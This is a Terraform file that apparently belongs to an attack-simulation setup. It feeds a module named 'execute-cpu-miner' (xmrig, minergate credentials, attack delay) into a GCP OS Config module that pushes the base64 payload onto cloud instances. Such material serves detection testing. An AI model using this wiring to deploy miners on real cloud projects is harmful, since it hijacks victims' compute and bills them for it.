###########################
# PAYLOAD 
###########################

module "payload" {
    source = "../../../../common/payloads/linux/modules/execute-cpu-miner"
    inputs = {
        environment       = var.environment
        deployment        = var.deployment
        tag               = var.tag
        minergate_server    = var.minergate_server
        minergate_user      = var.minergate_user
        xmrig_version       = var.xmrig_version
        attack_delay        = var.attack_delay
    }
}

#####################################################
# GCP OSCONFIG
#####################################################

module "osconfig" {
  source            = "../base"
  environment       = var.environment
  deployment        = var.deployment
  gcp_project_id    = var.gcp_project_id
  gcp_location      = var.gcp_location
  tag               = var.tag
  base64_payload    = module.payload.outputs["base64_payload"]
}